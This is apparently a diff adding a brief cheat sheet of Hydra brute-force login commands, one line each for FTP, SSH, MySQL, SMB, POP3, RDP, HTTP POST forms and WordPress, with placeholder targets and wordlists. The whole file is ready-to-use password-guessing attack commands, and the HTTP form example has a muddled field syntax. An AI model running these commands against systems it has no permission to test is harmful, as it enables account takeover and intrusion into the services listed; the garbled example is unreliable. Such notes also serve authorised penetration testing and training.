@@ -1,0 +1,38 @@
+Hydra
+---------
+Syntax 
+	hydra [OPTIONS] $IP
+
+For custom port use
+	-s port-number
+
+FTP
+	hydra -l user -P /path-to-wodlist.txt $IP -t [1-36] ftp -vV -f
+
+
+SSH
+	hydra -l user -P /path-to-wordlist.txt $IP -t [1-36] ssh -vV -f
+
+
+MySQL
+	hydra -l user -P /path-to-wordlist.txt $IP -t [1-36] mysql -vV -f
+
+
+SMB
+	hydra -l user -P /path-to-wordlist.txt $IP -t [1-36] smb -vV -f
+
+
+POP3
+	hydra -l user -P /path-to-wordlist.txt $IP -t [1-36] pop3 -vV -f
+
+
+Windows Remote Desktop
+	hydra -l user -P /path-to-wordlist.txt rdp:$IP -t[1-36] -vV -f
+
+HTTP Post Form
+	hydra -l user -P /path-to-wordlist.txt {domain.com or $IP} http-post-form "{Web-Page-Login-path}:{Form-body}:{Erro Message}" -vV -f
+Ex:-
+	hydra -l user -P /path-to-wordlist.txt {example.com or 10.10.10.10} http-post-form "user/login.php:username{that show in login form}:^USER^&password{that show in login form}:^PASS^:Incorrect Username or Password" -vV -f
+
+WordPress
+	hydra -l user -P /path-to-wordlist.txt $IP http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -vV -f
